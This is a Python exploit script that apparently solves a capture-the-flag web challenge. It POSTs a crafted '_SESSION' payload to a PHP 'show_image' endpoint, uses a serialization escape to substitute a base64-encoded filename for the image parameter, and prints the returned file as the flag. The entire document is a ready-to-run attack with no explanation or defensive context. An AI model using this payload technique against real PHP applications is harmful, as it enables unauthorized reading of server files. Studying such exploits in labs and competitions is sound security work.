from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import post

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }

        data = '_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'

        url = url + 'index.php?f=show_image'

        print(url)

        flag = post(url=url, headers=headers, data=data).text

        print(flag)
